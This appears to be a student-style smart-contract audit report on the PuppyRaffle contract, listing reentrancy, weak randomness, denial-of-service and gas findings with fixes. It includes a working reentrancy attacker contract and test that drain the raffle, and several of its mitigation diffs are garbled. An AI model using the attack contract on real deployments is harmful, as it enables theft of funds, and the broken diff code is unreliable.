### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance.

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Check, Effects, Interactions) and as a result, enables participants to drain contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

<details>

```javascript
   function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

</details>

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. User enters the raffle.
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle.
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

**Proof of Code**
Place the following into `PuppyRaffleTest.t.sol`

<details>
<summary>Code</summary>

```javascript
 function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReetrancyAttacker attackerContract = new ReetrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        // attack
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker contract balance: ", startingAttackContractBalance);
        console.log("starting contrackt balance:", startingContractBalance);

        console.log("ending attacker contract balance", address(attackerContract).balance);
        console.log("ending contract balance", address(puppyRaffle).balance);
    }
```

And this contract as well:

```javascript
contract ReetrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
```

</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle:refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows user to influence or predict the winner and predict the winning puppy

**Description:** Hasing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable find number. A predictable number is not a good random number. Malicious users can manipulate these values or know them or know them ahead of time to chose the winner of the raffle themselves.

_Note_ This additionally mean users could front-run this function and call `refund` if they are not the winner.

**Impact:** Any user can influence the winner of the raffle, winning the same money and selecting the `rarest` puppy. Making the entire raffle worthless id it becomes a gas war as to who wins the raffle.

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate.
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner!
3. Users can revert their `selectWinner` transaction if they don't like the winner or resulting puppy

**Recommended Mitigation:** Consider using a cryptographically provable number generator such as Chainlink VRF.

### [M-#] Looping through players array to check to duplicates in `PuppyRaffel::enterRaffel` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants.

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle stats will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

```javascript
// @audit Dos Attack
 for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
```

**Impact:** The gas cost for raffle entrants will greatly increase as more players enter the raffle. Discouraging later user from entering, and causing a rush at the start of a raffle to be one of the first entrants in the queue.

An attacker might make the `PuppyRaffle::entrants` array so big, that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas cost will be as such:

- 1st 100 players: -6252048 gas
- 2nd 100 players: -18068138 gas

This is more than 3x more expensive for the second 100 players.

<details>
<summary>PoC</summary>

Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
function test_denialOfService() public {
        vm.txGasPrice(1);

        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players", gasUsedFirst);

        // now for the 2nd 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }
        // see how much gas it cost
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("Gas cost of the second 100 players: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
}

```

</details>

**Recommended Mitigation:** There are a few recommendations.

1. Consider allowing duplicates. Users can make new wallets address anyways, so duplicate check dosen't prevent the same person form entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.

# Low

### [L-1] `PuppyRaffle:getActivePlayerIndex` return 0 for non-existing players and for players at index 0, causing a player at index 0 to incorrectly think they hva not entered the raffle

**Description:** If a player is in the `PuppyRaffle:players` array at index 0, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.

```javascript
     function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }

```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enter the raffle. they are the first entrant.
2. `PuppyRaffle::getActivePlayerIndex` return 0.
3. User thinks they have not entered correctly due to the function documentation.

**Recommended Mitigation:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0.

You could also reserve the 0th position for any competition, but a better solution might be to return an `int256` where the function returns -1 if the player is not active.

# Gas

## [G-1] Unchanged state variables should be declared constant or immutable.

Reading form storage is much more expensive than reading from a constant or immutable variables.

Instances:

- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`

### [G-2] Storage variable in a loop should be cached

Everytime you call `players.lenght` you read from storage, as opposed to memory whice is more gas afficient.

```diff
+    uint256 playerLength = players.lenght;
-    for (uint256 i = 0; i < players.length - 1; i++) {
+    for (uint256 i = 0; i < playersLength - 1; i++) {
-           for (uint256 j = 1; + 1; j < players.length; j++) {
+           for (uint256 j = 1; + 1; j < playersLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

```

### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. FO for example, instead of `pragma solidity ^0.8.0` use `pragma solidity 0.8.8`

- Found in src/PuppyRaffle.sol: 32:23:35

### [I-2] Using an outdated version of Solidity is not recommended

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend complex pragma statement.

**Recommendations**
Deploy with any of the following Solidity versions:

`0.8.18`
The recommendations take into account:

- Risk related to recent releases
- Risk of complex cod generation changes
- Risk of new language features
- Risk of known bugs
- Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

### [I-3] Rising checks for `address(0)` when assigning values to address state variable

Assigning values to address state variables without checking for `address(0)`

- Found in src/PuppyRaffle.sol: 8862:23:35
- Found in src/PuppyRaffle.sol: 3165:24:35
- Found in src/PuppyRaffle.sol:m 9809:26:35

### [i-4] `PuppyRaffle::selectWinner` does not follow CEI, which is not best practice.

It`s best to keep code clean and follow CEI (Checks, Effects, Interactions)

```diff
-       (bool success,) = winner.call{value: prizePool}("");
-       require(success, "PuppyRaffle: Failed to send prize pool to winner)
        _safeMint(winner, tokenId)
+       (bool success) = winner.call{value: prizePool}("");
+       require(success, "PuppyRaffle: Failed to send prize to winner"):

```

### [I-5] Use of "magic" numbers is discouraged

It can be confusing to see number literals in a codebase, and it`s much more readable if the numbers are given a name.

Example:

```javascript
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
```

Instead you can use:

```javascript
uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
uint256 public constant FEE_PRECENTAGE = 20;
uint256 public constant POOL_PRECISION= 100;

```
